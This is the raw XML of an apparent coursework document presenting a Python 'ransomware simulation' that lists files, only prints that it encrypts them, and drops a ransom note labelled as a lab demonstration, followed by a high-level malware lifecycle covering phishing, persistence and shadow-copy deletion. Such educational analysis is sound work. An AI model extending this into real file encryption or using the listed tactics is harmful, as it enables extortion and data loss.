      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(target)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608A773A"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if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>os.path</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.isfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>os.path.join</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(target, f))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0CE39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
    <w:p w14:paraId="78839A1A" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BBBC28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encrypted_count</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D223186" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43D2A6FD"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for file in files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035D126D"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if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>file.endswith</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(".key") or file == "README.txt":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2498A343"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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBBF5A5" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BCB662C"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gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f"  [ENCRYPT] {file} (simulation only)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251B9EC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encrypted_count</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA6BDEA"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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(0.2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD08563" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C99F677"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 Ransom note (clearly marked as simulation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5991025A"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r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>note_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>os.path</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.join</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(target, "README.txt")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B142FB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with </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>open(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>note_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, "w") as note:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4076F3A4"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>note.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>("=== RANSOMWARE SIMULATION ===\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6DBFF5"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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>note.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f"Attack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID: {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>attack_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>}\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4369EAA0"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>note.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>("This is a lab-only demonstration.\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515AE70C" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="275E98EB"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print(f"\</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>+] Ransom note created: {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>note_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="731D35E0"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 xml:space="preserve">    print(f"[+] Files affected (simulated): {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>encrypted_count</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A8CFA8" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61332E7B" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148"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reconnaissance(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038B0558" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0758C096" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>simulate_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>encryption</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E0F622" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B4F66AB" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>print("\</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>+] SIMULATION COMPLETE")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B3030F" w14:textId="702292BF" w:rsidR="00B95E87" w:rsidRPr="003F1A9E" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00241148">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>"=" * 60)</w:t>
      </w:r>
      <w:r w:rsidR="006E6758" w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5359D504" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="003F1A9E" w:rsidRDefault="00241148" w:rsidP="00241148">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12893E28" w14:textId="77777777"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3. Malware Lifecycle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3622378F" w14:textId="2FF770E5"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Initial Access:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Phishing emails with malicious attachments</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- RDP brute-force attacks</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Exploit kits</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Supply-chain compromise</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Execution:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Dropper loads payload</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Attempts privilege escalation</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Evades antivirus detection</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Persistence:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Registry Run keys</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Scheduled tasks</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Windows services</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Evasion:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Deletes shadow copies</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Disables recovery options</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Polymorphism and obfuscation</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lastRenderedPageBreak/>
        <w:br/>
        <w:t>Impact / Actions on Objective:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Encrypts files using strong cryptography</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Extortion: data theft and publication threats</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
